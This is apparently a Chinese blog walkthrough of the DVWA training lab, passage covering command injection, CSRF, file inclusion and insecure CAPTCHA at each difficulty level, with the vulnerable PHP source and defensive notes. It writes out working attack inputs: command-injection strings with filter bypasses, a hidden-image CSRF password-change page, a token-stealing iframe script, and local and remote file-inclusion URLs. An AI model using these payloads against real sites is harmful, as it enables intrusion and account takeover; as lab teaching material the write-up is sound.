tokengenerateSessionToken();?&gt;</code></pre><p>以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p><p>这个确实已经结合业务场景来进行约束了。</p><p><strong>暴力破解防护建议：</strong></p><p>&lt;1&gt;登录页面采用有效的验证码机制<br>&lt;2&gt;对用户密码错误的次数做限制</p><h1 id="Command-Injection（命令注入）"><a href="#Command-Injection（命令注入）" class="headerlink" title="Command Injection（命令注入）"></a>Command Injection（命令注入）</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) {    // Get input//获取IP字段    $target = $_REQUEST[ 'ip' ];    // Determine OS and execute the ping command.//确定操作系统并执行ping命令// stristr(string,search,before_search)//stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配//点），如果未找到所搜索的字符串，则返回FALSE。参数string规定被搜索的字符串，参//数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的ASCII值//的字符），可选参数before_true为布尔型，默认为“false”，如果设置为“true”，函//数将返回search参数第一次出现之前的字符串部分。// php_uname(mode)//这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包//含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” //r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {        // Windows        $cmd = shell_exec( 'ping  ' . $target );    }    else {        // *nix        $cmd = shell_exec( 'ping  -c 4 ' . $target );    }    // Feedback for the end user    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";}?&gt;</code></pre><p><strong>tristr(string,search,before_search)</strong></p><p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回  FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII  值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search  参数第一次出现之前的字符串部分。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定被搜索的字符串。</td></tr><tr><td><em>search</em></td><td>必需。规定所搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td><em>before_search</em></td><td>可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><p><a href="https://www.runoob.com/php/func-string-stristr.html">https://www.runoob.com/php/func-string-stristr.html</a></p><p><strong>php_uname(mode)</strong></p><p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s  ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p><p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p><p>window和linux系统都可以用&amp;&amp;来执行多条命令</p><pre><code>127.0.0.1&amp;&amp;net user</code></pre><pre><code>127.0.0.1&amp;&amp;dir</code></pre><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) {    // Get input    $target = $_REQUEST[ 'ip' ];    // Set blacklist//设置命令黑名单，里面包含&amp;&amp;和；    $substitutions = array(        '&amp;&amp;' =&gt; '',        ';'  =&gt; '',    );    // Remove any of the charactars in the array (blacklist).//将参数中有&amp;&amp;和；的都替换成空    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {        // Windows        $cmd = shell_exec( 'ping  ' . $target );    }    else {        // *nix        $cmd = shell_exec( 'ping  -c 4 ' . $target );    }    // Feedback for the end user    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";}?&gt;</code></pre><h3 id="str-replace-find-replace-string"><a href="#str-replace-find-replace-string" class="headerlink" title="str_replace(find,replace,string)"></a><strong>str_replace(find,replace,string)</strong></h3><p>把字符串 string 中的字符 find 替换为 replace</p><h4 id="DOS中-amp-用法"><a href="#DOS中-amp-用法" class="headerlink" title="DOS中&amp;用法"></a>DOS中&amp;用法</h4><p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p><p>Command 1&amp;&amp;Command 2</p><p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p><p>Command 1&amp;Command 2</p><p>先执行Command 1，不管是否成功，都会执行Command 2</p><pre><code>127.0.0.1&amp;ipconfig</code></pre><p>由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</p><pre><code>127.0.0.1&amp;;&amp;ipconfig</code></pre><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) {    // Get input    $target = trim($_REQUEST[ 'ip' ]);    // Set blacklist//设置命令黑名单，里面包含&amp; ；| - $ ( ) \ ' ||    $substitutions = array(        '&amp;'  =&gt; '',        ';'  =&gt; '',        '| ' =&gt; '',        '-'  =&gt; '',        '$'  =&gt; '',        '('  =&gt; '',        ')'  =&gt; '',        '`'  =&gt; '',        '||' =&gt; '',    );    // Remove any of the charactars in the array (blacklist).//替换成空    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {        // Windows        $cmd = shell_exec( 'ping  ' . $target );    }    else {        // *nix        $cmd = shell_exec( 'ping  -c 4 ' . $target );    }    // Feedback for the end user    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";}?&gt;</code></pre><p>这里吧&amp; ；| - $ ( ) \ ‘ ||券替</p><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p><p>6666</p><p>127.0.0.1|net user</p><h4 id="可用trim-函数解决这个问题，因为-trim-str-可以删除字符串左右两边的空格。"><a href="#可用trim-函数解决这个问题，因为-trim-str-可以删除字符串左右两边的空格。" class="headerlink" title="可用trim()函数解决这个问题，因为 trim(str) 可以删除字符串左右两边的空格。"></a>可用trim()函数解决这个问题，因为 trim(str) 可以删除字符串左右两边的空格。</h4><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input    $target = $_REQUEST[ 'ip' ];// stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。    $target = stripslashes( $target );    // Split the IP into 4 octects//将具体的IP以.分隔// explode(separator,string,limit)把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。    $octet = explode( ".", $target );    // Check IF each octet is an integer//检查是否分成了4块，并且每一块是否都为数字// s_numeric(string)检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {        // If all 4 octets are int's put the IP back together.        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {            // Windows            $cmd = shell_exec( 'ping  ' . $target );        }        else {            // *nix            $cmd = shell_exec( 'ping  -c 4 ' . $target );        }        // Feedback for the end user        echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";    }    else {        // Ops. Let the user name theres a mistake        echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;';    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>可以看到，本等级的服务器源代码已被重写，只允许非常严格的输入。 如果不匹配并且没有产生特定结果，则将不允许执行它。 相比于前面2个等级的“黑名单”过滤（允许任何输入并删除不需要的内容），使用“<strong>白名单</strong>”（仅允许输入ip地址）更加安全。</p><h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><pre><code>&lt;?phpif( isset( $_GET[ 'Change' ] ) ) {    // Get input    $pass_new  = $_GET[ 'password_new' ];    $pass_conf = $_GET[ 'password_conf' ];    // 校验密码    if( $pass_new == $pass_conf ) {        // T相同使用mysqli-real-escape-string函数转义        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );//md5加密pass_new        // 更新数据库密码        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // 返回密码改变到前端        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with passwords matching        echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?&gt; </code></pre><p>这里对CSRF没有防御机制（只检查cookie）</p><h3 id="检测csrf的方法："><a href="#检测csrf的方法：" class="headerlink" title="检测csrf的方法："></a>检测csrf的方法：</h3><h5 id="1-burp抓包"><a href="#1-burp抓包" class="headerlink" title="1.burp抓包"></a>1.burp抓包</h5><h5 id="2-右键工具中使用csrf-poc工具"><a href="#2-右键工具中使用csrf-poc工具" class="headerlink" title="2.右键工具中使用csrf poc工具"></a>2.右键工具中使用csrf poc工具</h5><h5 id="3-创造站点"><a href="#3-创造站点" class="headerlink" title="3.创造站点"></a>3.创造站点</h5><h5 id="4-访问浏览器"><a href="#4-访问浏览器" class="headerlink" title="4.访问浏览器"></a>4.访问浏览器</h5><h5 id="5-出现密码修改存在csrf"><a href="#5-出现密码修改存在csrf" class="headerlink" title="5.出现密码修改存在csrf"></a>5.出现密码修改存在csrf</h5><p>最基础的改密码payload</p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change </code></pre><p>payload中可以看到密码已被修改，且有在前端提示</p><p><strong>C) 构造攻击页面</strong></p><p>查看本机ip</p><pre><code>172.20.10.5</code></pre><p>诱导用户访问该ip</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p><pre><code>&lt;img src="http://172.20.10.5/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change " border="0" style="display:none;"/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</code></pre><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\黑客站点.png" alt="黑客站点"></p><p>这台机器的IP</p><p>访问IP默认会打开index.php。那么就意味着，我把index里面的内容换成上述的代码，并且诱导用户浏览器访问这个IP就可以达到我不可告人的目的</p><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpif( isset( $_GET[ 'Change' ] ) ) {    // 检查请求    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {       //检查前后密码是否一致        $pass_new  = $_GET[ 'password_new' ];        $pass_conf = $_GET[ 'password_conf' ];              if( $pass_new == $pass_conf ) {            // 一致时            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));            $pass_new = md5( $pass_new );            // 更新数据库            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );            // Feedback for the user            echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";        }        else {            // Issue with passwords matching            echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";        }    }    else {        // Didn't come from a trusted source        echo "&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}</code></pre><h3 id="stripos-string-find-start"><a href="#stripos-string-find-start" class="headerlink" title="stripos(string,find,start)"></a>stripos(string,find,start)</h3><p>返回字符串在另一字符串中第一次出现的位置（不区分大小写），如果没有找到字符串则返回 FALSE。</p><p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是127.0.0.1），希望通过这种机制抵御CSRF攻击。</p><p>Host 192.168.31.155</p><p>Referer <a href="http://192.168.31.103/192.168.31.155.php">http://192.168.31.103/192.168.31.155.php</a></p><p>从技术上就可以绕过了，但是新构造的这个192.168.31.155.php，很容易被发现，只有进行URL转码了</p><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_GET[ 'Change' ] ) ) {    // Check Anti-CSRF token//可以看到加入了token机制    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input    $pass_new  = $_GET[ 'password_new' ];    $pass_conf = $_GET[ 'password_conf' ];    // Do the passwords match?    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update the database        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // Feedback for the user        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with passwords matching        echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>客户端访问修改密码页面-&gt;服务器发一个token-&gt;用户修改参数的请求中加入了token参数-&gt;服务器验证token-&gt;成功修改</p><p>相当于把流程修改了，token的生成是随机的</p><p>构建这个恶意链接就不可取了因为token是随机的无法伪造</p><pre><code>&lt;script type="text/javascript"&gt;    function attack(){        document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;        document.getElementById("transfer").submit();     }&lt;/script&gt;&lt;iframe src="http://172.16.134.26/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;"&gt;&lt;/iframe&gt;&lt;body onload="attack()"&gt;    &lt;form method="GET" id="transfer" action="http://172.16.134.26/dvwa/vulnerabilities/csrf"&gt;        &lt;input type="hidden" name="password_new" value="password"&gt;        &lt;input type="hidden" name="password_conf" value="password"&gt;        &lt;input type="hidden" name="user_token" value=""&gt;        &lt;input type="hidden" name="Change" value="Change"&gt;    &lt;/form&gt;&lt;/body&gt;</code></pre><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_GET[ 'Change' ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input//输入原来的密码    $pass_curr = $_GET[ 'password_current' ];    $pass_new  = $_GET[ 'password_new' ];    $pass_conf = $_GET[ 'password_conf' ];    // Sanitise current password input    $pass_curr = stripslashes( $pass_curr );    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass_curr = md5( $pass_curr );    // Check that the current password is correct    $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );    $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );    $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );    $data-&gt;execute();    // Do both new passwords match and does the current password match the user?    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {        // It does!        $pass_new = stripslashes( $pass_new );        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update database with new password        $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );        $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );        $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );        $data-&gt;execute();        // Feedback for the user        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with passwords matching        echo "&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;";    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>要求输入原始密码</p><h1 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h1><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启alLow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的alLow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）</p><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php// The page we wish to display$file = $_GET[ 'page' ];?&gt; </code></pre><h4 id="1、本地文件包含"><a href="#1、本地文件包含" class="headerlink" title="1、本地文件包含"></a>1、本地文件包含</h4><pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php</code></pre><pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code></pre><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\本地文件包含.png" alt="本地文件包含"></p><h4 id="2、远程文件包含"><a href="#2、远程文件包含" class="headerlink" title="2、远程文件包含"></a><strong>2、远程文件包含</strong></h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在远程服务器 172.16.135.47 上传一个phpinfo.txt文件，内容如下</p><pre><code>&lt;?phpphpinfo();?&gt;</code></pre><pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/?page=http://172.20.10.5/dvwa/phpinfo可以编码</code></pre><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Input validation//将参数中的http:// https:// ../ ..\都替换成空$file = str_replace( array( "http://", "https://" ), "", $file );$file = str_replace( array( "../", "..\"" ), "", $file );?&gt;</code></pre><p>使用str_replace函数是极其不安全的，因为可以使用<strong>双写绕过</strong>替换规则。</p><h4 id="1、本地文件包含-1"><a href="#1、本地文件包含-1" class="headerlink" title="1、本地文件包含"></a><strong>1、本地文件包含</strong></h4><pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\software\wamp\www\dvwa\php.ini</code></pre><h4 id="2、远程文件包含-1"><a href="#2、远程文件包含-1" class="headerlink" title="2、远程文件包含"></a><strong>2、远程文件包含</strong></h4><pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/page=htthttp://p://172.20.10.5/dvwa/phpinfo.txt</code></pre><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php// The page we wish to display$file = $_GET[ 'page' ];//文件名以file开始，或者只能为include.phpif( !fnmatch( "file*", $file ) &amp;&amp; $file != "include.php" ) {    // This isn't the page we want!    echo "ERROR: File not found!";    exit;}?&gt;</code></pre><p><strong>fnmatch()</strong> 函数根据指定的模式来匹配文件名或字符串。</p><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以<strong>利用**</strong>file**<strong>协议绕过防护策略</strong>。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议</p><pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/?page=file:///D:/software/wamp/www/dvwa/php.ini</code></pre><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Only allow include.php or file{1..3}.phpif( $file != "include.php" &amp;&amp; $file != "file1.php" &amp;&amp; $file != "file2.php" &amp;&amp; $file != "file3.php" ) {    // This isn't the page we want!    echo "ERROR: File not found!";    exit;}?&gt;</code></pre><p>Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p><h1 id="Insecure-CAPTCHA（不安全的验证码-不安全的验证流程）"><a href="#Insecure-CAPTCHA（不安全的验证码-不安全的验证流程）" class="headerlink" title="Insecure CAPTCHA（不安全的验证码/不安全的验证流程）"></a>Insecure CAPTCHA（不安全的验证码/不安全的验证流程）</h1><p>Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。但个人觉得，这一模块的内容叫做不安全的验证流程更妥当些，因为这块主要是验证流程出现了逻辑漏洞，谷歌的验证码表示不背这个锅</p><p>DVWA中主要是输入当前的密码以及新密码，用来修改密码<br>![insecure captcha](D:\blog\source_posts\DVWA\insecure captcha.jpg)</p><h4 id="reCAPTCHA验证流程"><a href="#reCAPTCHA验证流程" class="headerlink" title="reCAPTCHA验证流程"></a><strong>reCAPTCHA验证流程</strong></h4><p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\recaptcha.png" alt="recaptcha"></p><p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p><p><strong>recaptcha_check_answer(*p\</strong>r*<em>i*</em>v*<em>k*</em>e*<em>y\</em>,**</p><p><strong>remoteip, *c\</strong>h*<em>a*</em>l*<em>l*</em>e*<em>n*</em>g*<em>e\</em>,**</p><p><strong>response)</strong></p><p>参数<em>p<strong>r</strong>i<strong>v</strong>k<strong>e</strong>y</em>是服务器申请的<em>p<strong>r</strong>i<strong>v</strong>a<strong>t</strong>e<strong>k</strong>e**y</em>，</p><p>remoteip是用户的ip，<em>c<strong>h</strong>a<strong>l</strong>l<strong>e</strong>n<strong>g</strong>e</em>是<em>r<strong>e</strong>c<strong>a</strong>p<strong>t</strong>c<strong>h</strong>a<strong>c</strong>h<strong>a</strong>l<strong>l</strong>e<strong>n</strong>g<strong>e</strong>f<strong>i</strong>e<strong>l</strong>d</em>字段的值，来自前端页面，</p><p>response是 recaptcha_response_field 字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：</p><ul><li>$is_valid是布尔型的，表示校验是否有效，</li><li>$error是返回的错误代码。</li></ul><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php//验证身份if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {    // 隐藏验证码表单    $hide_form = true;    // 获得且确认新密码    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    //第三方身份验证    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key'],        $_POST['g-recaptcha-response']    );    // Did the CAPTCHA fail?    if( !$resp ) {        // What happens when the CAPTCHA was entered incorrectly        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";        $hide_form = false;        return;    }    else {        // CAPTCHA was correct. Do both new passwords match?        if( $pass_new == $pass_conf ) {            // Show next stage for the user            $html .= "                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;                &lt;form action=\"#\" method=\"POST\"&gt;                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;                    &lt;input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /&gt;                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /&gt;                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;                &lt;/form&gt;";        }        else {            // Both new passwords do not match.            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";            $hide_form = false;        }    }}//检查两次密码是否一致，并更新密码if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check to see if both password match    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update database        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // Feedback for the end user        $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with the passwords matching        $html .= "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";        $hide_form = false;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?&gt;</code></pre><p>可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p><p><strong>1.通过构造参数绕过验证过程的第一步</strong></p><p>首先输入密码，点击Change按钮，抓包：</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424102955500-586208657.png" alt="1375459-20200424102955500-586208657"></p><p>更改step参数绕过验证码</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424103056556-345258237.png" alt="1375459-20200424103056556-345258237"></p><p>修改密码成功<img 